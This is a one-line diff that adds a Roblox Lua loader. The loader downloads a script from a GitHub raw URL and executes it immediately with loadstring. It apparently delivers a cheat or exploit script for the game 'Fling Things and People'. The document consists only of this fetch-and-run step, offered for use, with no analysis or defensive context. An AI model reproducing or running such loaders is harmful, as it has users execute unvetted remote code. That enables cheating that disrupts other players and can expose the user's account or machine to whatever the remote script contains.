@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/fling-things-and-people-spam0-dr3vt8zio9s7d6.lua"))()
